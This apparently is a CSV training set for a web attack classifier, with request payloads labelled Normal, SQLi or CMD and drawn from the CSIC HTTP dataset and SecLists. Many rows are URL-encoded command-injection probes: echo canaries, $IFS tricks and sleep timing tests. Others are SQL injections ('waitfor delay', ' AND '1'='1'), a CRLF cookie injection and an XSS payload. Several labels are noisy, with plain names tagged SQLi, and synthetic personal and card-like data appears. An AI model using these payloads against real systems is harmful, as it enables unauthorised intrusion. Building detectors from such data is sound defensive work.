payload,label,source
1nIqUi0Ar,Normal,csic_gsi:cisc_normalTraffic_test.txt
C5868AED7B2D62919310A5F590EE435B,Normal,csic_gsi:cisc_normalTraffic_test.txt
C1B528E13DAC01C8DA78EB8BF17E93F9,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6529578DF04FAFD031FB6A57BFF65041,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6FA7BC50D9A3B138F40563F6BA208229,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
36D8045743803217E1F79F1197211FB5,Normal,csic_gsi:cisc_normalTraffic_train.txt
6190A43833B723FE9AE7829980B4E475,Normal,csic_gsi:cisc_normalTraffic_test.txt
BB776A954E68431225289DBC52153B8F,Normal,csic_gsi:cisc_normalTraffic_train.txt
Credenciales+incorrectasparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3653F5497EA83C0DD86A5ABDBEF5FB6D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
F14D4D603D47A047274BAC73FE016E62,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
'&echo%20EBREVB$((48%2B67))$(echo%20EBREVB)EBREVB,CMD,seclists_cmd
98143561P,Normal,csic_gsi:cisc_normalTraffic_test.txt
B1245DA00A1D0EC29B04C95491CA14DF,Normal,csic_gsi:cisc_normalTraffic_train.txt
39,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
A1AD362E23AB133C381F81289CD7F3AA,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
783FFD375A8E3A47C730B0AB83672A30,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2527%0A%20str%3D%24%28echo%20WYAQUW%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,seclists_cmd
Ar�s+Yermo,Normal,csic_gsi:cisc_normalTraffic_train.txt
7AB0CA2F640173D060D43AD4FAFC942B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Cordon+Ketzner,Normal,csic_gsi:cisc_normalTraffic_test.txt
BEAE919D6871705826D34213F6A0EE92,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1AE33DFFD75B1835A3800C59D97BA142,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
rajan,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%20echo%20AXKFNN$((42%2B98))$(echo%20AXKFNN)AXKFNN%27,CMD,seclists_cmd
Albacete,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Mas+Suy,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
51A6FD8D03F6CED3BFA8561C132A24B0,Normal,csic_gsi:cisc_normalTraffic_train.txt
158BF8CA5982F76B823847B2897E45A2,Normal,csic_gsi:cisc_normalTraffic_test.txt
"ceno,taf''io",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
${passthru(print(`echo%20DAORGO`.`echo%20$((65%2B75))`.`echo%20DAORGO`.`echo%20DAORGO`)%29%7DDAORGO,CMD,seclists_cmd
D67D854F062BE83EF0E71357A86E4FCE,Normal,csic_gsi:cisc_normalTraffic_test.txt
7390C96AD08E0EC746D930F7B1444C0C,Normal,csic_gsi:cisc_normalTraffic_test.txt
83716368W,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3Becho$IFSMKSRXM$((30%2B19))$(echo$IFSMKSRXM)MKSRXM|,CMD,seclists_cmd
0E5CB099475EAC2E8C6375757E98CCDB,Normal,csic_gsi:cisc_normalTraffic_test.txt
613F3A59CC5CC2DB243F895B50444237,Normal,csic_gsi:cisc_normalTraffic_train.txt
6078216616409598,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
DE46C99602824AF0F451D3CC907A5C65,Normal,csic_gsi:cisc_normalTraffic_test.txt
415256E4C1A83AEB16E80197229FAF75,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22echo$IFSJBTZFF$((9%2B76))$(echo$IFSJBTZFF)JBTZFF%22,CMD,seclists_cmd
3ra41,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
boulay,Normal,csic_gsi:cisc_normalTraffic_train.txt
DDB1576EE9F8AA1E07B4B52559CA16D2,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Carrer+Nostra+Sra+Del+Pilar,+101+",Normal,csic_gsi:cisc_normalTraffic_train.txt
D5699F392B5A5DC4A5D6F0F800BA6CD1,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
49B37589097A83BBA007217D14D7721C,Normal,csic_gsi:cisc_normalTraffic_test.txt
E5F177E9CB1D0E805E892E60694380AD,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22;echo$IFSCOXAAL$((47%2B23))$(echo$IFSCOXAAL)COXAAL%22,CMD,seclists_cmd
BCF1508B9ED80836D3FC5FACAC2750A6,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&loginA=ginsberg&pwd=e23am!pa83r&remember=on&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
05514,Normal,csic_gsi:cisc_normalTraffic_test.txt
EB9199A1C64990903D20E8A37514522A,Normal,csic_gsi:cisc_normalTraffic_test.txt
0FCAE7201C9990C659A1B08C4C6C2A29,Normal,csic_gsi:cisc_normalTraffic_train.txt
17,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
gallatin.woodbridge@discon.ma,Normal,csic_gsi:cisc_normalTraffic_test.txt
EACC9D0B03E55866113B1D4F835D1C50,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=2231&B1=Confirmar/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5348568064095524,Normal,csic_gsi:cisc_normalTraffic_test.txt
C385E2EA5616DC2EA09366A61A522F24,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
ACAFD031A11FC3011F67E01A50A94E0F,Normal,csic_gsi:cisc_normalTraffic_test.txt
CDBFE4B5F1E0DD093D1F76236487AC21,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Farell+100,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
39527,Normal,csic_gsi:cisc_normalTraffic_train.txt
A734F59611AE0BBC1960CBF139A3A263,Normal,csic_gsi:cisc_normalTraffic_train.txt
11845322T,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
A29E19E127863BAACCD2E311C1B05D6B,Normal,csic_gsi:cisc_normalTraffic_test.txt
84711932B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=8434&B1=Pasar+por+caja/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22echo%20FGEIMA$((19%2B87))$(echo%20FGEIMA)FGEIMA,CMD,seclists_cmd
21240,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
715417c94oR$i3,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
9195F8EBE93173CEF9C045800575A0D5,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=2&nombre=Jam�n+Ib�rico&precio=85&cantidad=25%3F&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
24210,Normal,csic_gsi:cisc_normalTraffic_test.txt
61919FB901A19EDC6C2C88419449D03D,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Cretes,+164+",Normal,csic_gsi:cisc_normalTraffic_test.txt
id=1'+AND+'1'='1,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=2any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
40180,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27echo%20XBOYVS$((29%2B20))$(echo%20XBOYVS)XBOYVS,CMD,seclists_cmd
5565,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Pires+Arajol,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%207%20-ne%20%24%28echo%20GSLYBH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//,CMD,seclists_cmd
01170,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
343C4B3372FA8EF22FB1A4341FF1F2D9,Normal,csic_gsi:cisc_normalTraffic_train.txt
19B134412050AA5A8DE44205218304C5,Normal,csic_gsi:cisc_normalTraffic_train.txt
D066EC05911BAB3B02665331228165F2,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=lilllie8&pwd=4mpo599c7miento&rememberA=on&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2527%0A%20str%3D%24%28echo%20WYAQUW%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,seclists_cmd
E6B434473817EB3B6872E6F757330BE0,Normal,csic_gsi:cisc_normalTraffic_test.txt
57471AD6D7A7C5DAC0DC63DA4F3D83F4,Normal,csic_gsi:cisc_normalTraffic_test.txt
3226,Normal,csic_gsi:cisc_normalTraffic_train.txt
E4F9F680577B46664C07AD0B616C7B69,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=gaffney&password=1ilic�neo&nombre=Efeo&apellidos=Bassegoda+Foliaco&email=winchell.mille@biosaludsystems.museum&dni=09601387Z&direccion=Calle+Reja+75,+&ciudad=Cueva+del+Hierro&cp=44708&provincia=Segovia&ntc=8346016668545574&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
44B75B620396B83F9EAB799BD70C49A6,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=1&nombre=Jam�n+Ib�rico&precio=85&cantidad=69&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
D3B16775F5959DB259020C7320C9A252,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20MATZOK%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%252F%252F,CMD,seclists_cmd
modo=insertar&precio=6450&B1=Pasar+por+caja/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2527%7C%20%5B%206%20-ne%20%24%28echo%20RDJFGW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526,CMD,seclists_cmd
6F735C7AF8E9ACEE76EFD092CEC9F526,Normal,csic_gsi:cisc_normalTraffic_test.txt
83y1S,Normal,csic_gsi:cisc_normalTraffic_test.txt
Manganiello+La.??conich,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8FAE05EEF0B8C1DA7D19F199AEF4F181,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%26%26echo$IFSDXQHAS$((90%2B85))$(echo$IFSDXQHAS)DXQHAS%2F%2F,CMD,seclists_cmd
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20TPCDNB%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%255C%255C,CMD,seclists_cmd
Juanita,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20EBFNRE%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,CMD,seclists_cmd
81C2366B6BE60B1C6279175E9CFF3473,Normal,csic_gsi:cisc_normalTraffic_test.txt
E9B8D9BF2051D7D169044DFFF441BBB2,Normal,csic_gsi:cisc_normalTraffic_test.txt
jahnen@hojadecalculo.com.mm,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=registro&login=lanoszka&password=si1ovi3&nombre=Lautaro&apellidos=Desplans&email=macdougall_laurier@rocofer.am&dni=17218977G&direccion=C/+Juan+Perez+Arriete+19+13E&ciudad=M�lida&cp=39694&provincia=Barcelona&ntc=9302322356246829&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
5D9A0569FD027C0AC006B8AC0A1CA7E2,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20PDOPTJ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20//,CMD,seclists_cmd
C/+Idris+183+,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=401&B1=@40,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
'print(`echo%20MURMGO%0aecho%20$((13%2B87))%0aecho%20MURMGO%0aecho%20MURMGO`)%3B%25255C%25255CMURMGO,CMD,seclists_cmd
payson_hoven@quecole.za,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=3&nombre=Vino+Rioja&precio=85&cantidad=11&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
38523814X,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=thies&pwd=suponer&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=marks&password=3nco2o2a&nombre=Pomponio&apellidos=Atienza+Carrillo&email=spaleny@animationproject.jo&dni=54863575L&direccion=Av.+Basagoiti+21+&ciudad=Riba+de+Escalote,+La&cp=50369&provincia=Lleida&ntc=9701565921021862&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ERXFFG%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20,CMD,seclists_cmd
id=3&nombre=Queso+Manchego&precio=100&cantidad=47&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
A0C7F2A11BB9B9E12938CECE3078B7FB,Normal,csic_gsi:cisc_normalTraffic_train.txt
0CC22C879E0F46E133EC4143037E968F,Normal,csic_gsi:cisc_normalTraffic_train.txt
695E5998958C92A06D9D2F2CC1FC74C2,Normal,csic_gsi:cisc_normalTraffic_train.txt
791D49107E1EC0B9226C75E76A11B0A9,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%20echo%20VKXTTD$((59%2B83))$(echo%20VKXTTD)VKXTTD%22,CMD,seclists_cmd
F9CF9E49E88987C5119469D75F2F2741,Normal,csic_gsi:cisc_normalTraffic_train.txt
19278,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20JTPWXS%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
8e8ist6r,Normal,csic_gsi:cisc_normalTraffic_test.txt
huong,Normal,csic_gsi:cisc_normalTraffic_train.txt
'%3Becho$IFSTJRXTN$((69%2B61))$(echo$IFSTJRXTN)TJRXTN,CMD,seclists_cmd
44696230P,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
96187010K,Normal,csic_gsi:cisc_normalTraffic_test.txt
maryann,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
20D7C52CE25CAEDDFB1F036EC02177C4,Normal,csic_gsi:cisc_normalTraffic_train.txt
virulenta,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
390FFBE8A7D37F347A9F8654D81C6CF5,Normal,csic_gsi:cisc_normalTraffic_test.txt
%27%0A%20str%3D%24%28echo%20FXCZOR%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,seclists_cmd
76A6FC6C3EAA2628643CD3625AF85C22,Normal,csic_gsi:cisc_normalTraffic_train.txt
0260l6st116,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20UFTNKA%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%23,CMD,seclists_cmd
70E18F4FAA996E6880EB3FFFC5922C27,Normal,csic_gsi:cisc_normalTraffic_test.txt
9AAB9AF0541FBE782C813D90C8F2E037,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Cerro+Animas+199,+8?G",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
9B4AE7FABF77419E9F609615304256A0,Normal,csic_gsi:cisc_normalTraffic_test.txt
54289DAA7269E508E1B93A712B273FC6,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
49pu+22,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
galipeau,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%3B%20str%3D%24%28echo%20VPBZFR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2526,CMD,seclists_cmd
Fuente+el+Olmo+de+�scar,Normal,csic_gsi:cisc_normalTraffic_train.txt
5A08F0311B2CACE617EE0FC489655C76,Normal,csic_gsi:cisc_normalTraffic_train.txt
8975421069079015,Normal,csic_gsi:cisc_normalTraffic_train.txt
clendenning@frioelectric.web,Normal,csic_gsi:cisc_normalTraffic_train.txt
7896,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
A528C782302406D6FFA63044D31C802E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
01E01A983D3B1CFE17FCC68A637591BF,Normal,csic_gsi:cisc_normalTraffic_train.txt
13E8DCB2217A105656CEED0CB40E0E2E,Normal,csic_gsi:cisc_normalTraffic_test.txt
Estany+Arzaluz,Normal,csic_gsi:cisc_normalTraffic_test.txt
43CD35F5A187D261EB449005D98F8DDB,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C8EED57F795AD3A8D36058B22B735023,Normal,csic_gsi:cisc_normalTraffic_test.txt
B7DC4B21092D22503BE36F99E4BA7E4B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20VILFSX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,CMD,seclists_cmd
5369DFE4E060D63AC422429B25384E7F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=entrar&login=faez&pwd=e0carme7tad,a&remember=on&B1=Entrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B318743A4752705BDB9B551FEBA15C28,Normal,csic_gsi:cisc_normalTraffic_train.txt
&echo%20XYNJUX$((85%2B41))$(echo%20XYNJUX)XYNJUX//,CMD,seclists_cmd
26583931B02FDF7427E82F919CDE6E40,Normal,csic_gsi:cisc_normalTraffic_train.txt
BDDDE580BD74E7ECF8D7E4BA7583DC95,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%0aecho$IFSTWUNTD$((44%2B76))$(echo$IFSTWUNTD)TWUNTD,CMD,seclists_cmd
hisko,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Barbou,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20FNSLEC%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%257C,CMD,seclists_cmd
DAB2C6F79E6B8723814956E8E2552424,Normal,csic_gsi:cisc_normalTraffic_train.txt
Puigferrer+Ulldemol,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%3B%20str%3D%24%28echo%20GUASVW%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23,CMD,seclists_cmd
25139,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
9B04C1FA257AD29CC0CB361C3E266A52,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=kerlovic&password=lad�n&nombre=Vitalia&apellidos=Baeza+Redon&email=slavin@windshiptrader.coop&dni=95642019S&direccion=Jose+Maria+Mortes+Lerma,+151+11-D&ciudad=Campos+del+Para�so&cp=18449&provincia=Alicante&ntc=8158378459741170&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
3E437643D69BB8B00DE7705092A3F393,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
585C5EAF6DBEAAB63CD6FA1A14B61A0A,Normal,csic_gsi:cisc_normalTraffic_test.txt
48128,Normal,csic_gsi:cisc_normalTraffic_train.txt
C23AB053E14B1C209CCA06B825550D21,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8106388FBD9A7BFA1D6C7AC83DE3C359,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Melo,Normal,csic_gsi:cisc_normalTraffic_test.txt
BE24F089716D15AD47DBEBFBC9AEBF02,Normal,csic_gsi:cisc_normalTraffic_train.txt
7581470621974677,Normal,csic_gsi:cisc_normalTraffic_test.txt
11DC071531A7DDFA32A6261FB5FBBEB5,Normal,csic_gsi:cisc_normalTraffic_train.txt
CF026EDA3CEAA204C70E156CDEE78383,Normal,csic_gsi:cisc_normalTraffic_test.txt
Delujan,Normal,csic_gsi:cisc_normalTraffic_train.txt
c35t2ib6cI�1,Normal,csic_gsi:cisc_normalTraffic_train.txt
odonovan@piaceredelivery.ro,Normal,csic_gsi:cisc_normalTraffic_train.txt
FBAE64F3DDC2F14BEFFB24E25675D9A5,Normal,csic_gsi:cisc_normalTraffic_test.txt
0E477AED8A827C2716783FB877B58FDB,Normal,csic_gsi:cisc_normalTraffic_train.txt
zullarse,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5F156C94BBD895A1DFADCD261BA8E29F,Normal,csic_gsi:cisc_normalTraffic_test.txt
295D1FD6A8D6C851A6F272679FD822CB,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22echo%20KWRCTG$((97%2B95))$(echo%20KWRCTG)KWRCTG//,CMD,seclists_cmd
F65A4A8ACB647DFB67E2A63D42173523,Normal,csic_gsi:cisc_normalTraffic_train.txt
Sol�s+Cachiner,Normal,csic_gsi:cisc_normalTraffic_test.txt
81CE6F79942FFD8FBB65073533B55723,Normal,csic_gsi:cisc_normalTraffic_train.txt
Povedilla,Normal,csic_gsi:cisc_normalTraffic_train.txt
2A04E18E80DD7AAA351BF9B82E216165,Normal,csic_gsi:cisc_normalTraffic_test.txt
257D093D02FB411635BEABDD6DF8F96C,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3B%20str%3D%24%28echo%20OKKNHF%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,CMD,seclists_cmd
lilien@aprendeaestudiar.lt,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20XBWWVF%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,CMD,seclists_cmd
5AC056DC48689E0C392E955DE803371B,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=chaplin&password=salido&nombre=Pascuala&apellidos=Luque&email=pullman-mcclintock@surcosur.st&dni=50779094Q&direccion=Calle+Tortajada+S/N,+6?A&ciudad=Jabalquinto&cp=16118&provincia=Burgos&ntc=0932689894259111&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%3B%20str%3D%24%28echo%20WSGIYR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,CMD,seclists_cmd
%27%3B%20str%3D%24%28echo%20DHYUHH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23,CMD,seclists_cmd
E503D3A02EED7C8ECD588EC2C69B3EA7,Normal,csic_gsi:cisc_normalTraffic_test.txt
7119531551958366,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
;echo%20NHFBAI$((91%2B84))$(echo%20NHFBAI)NHFBAI%27,CMD,seclists_cmd
"modo=registro&login=','0','0','0','0');waitfor+delay+'0:0:15';--&password=erin&nombre=Regino&apellidos=Cortadel+Montori&email=litja@decoaching.cy&dni=40735914Q&direccion=Plza.+Pescador,+173,+&ciudad=Espejo&cp=15531&provincia=C�rdoba&ntc=9365944348061840&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=%20,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=8086&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_test.txt
111A59F447D035871172558C6380E1AC,Normal,csic_gsi:cisc_normalTraffic_train.txt
8AA816AC5597C5E4C540384EE5F2DA9F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D4A8129AECA7582A367BD2C29111C558,Normal,csic_gsi:cisc_normalTraffic_train.txt
"C/+Baladre+195,+10-C",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=1&nombre=Vino+Rioja&precio=100&cantidad=65&B1A=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4A2B9D39239FF3F472B8817FCECF22BF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
AE051196301BE9E2644E73DC644C21DF,Normal,csic_gsi:cisc_normalTraffic_train.txt
57229EF9AFF83B4E9342630E2DBB4014,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1540C42938A035E860AEEF602D52BFD0,Normal,csic_gsi:cisc_normalTraffic_test.txt
6353BEDFD48604C7061739FAB01AC4FD,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2527%7C%20%5B%208%20-ne%20%24%28echo%20LVDDNF%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,CMD,seclists_cmd
04E99A89CB03AF179A6AFAA7923725DA,Normal,csic_gsi:cisc_normalTraffic_test.txt
58556B677E3ABC3EF01AD0CC9B34CADF,Normal,csic_gsi:cisc_normalTraffic_test.txt
570E316DDB679D8AE3A3CF8313C4A054,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
&&echo$IFSVOFPVM$((35%2B53))$(echo$IFSVOFPVM)VOFPVM%27,CMD,seclists_cmd
Romildo,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
539A2B56F715093463B2A82F153DD3F3,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0aecho%20CQEILX$((20%2B83))$(echo%20CQEILX)CQEILX\,CMD,seclists_cmd
A594951DF7232DEF90A71203E8DF667C,Normal,csic_gsi:cisc_normalTraffic_test.txt
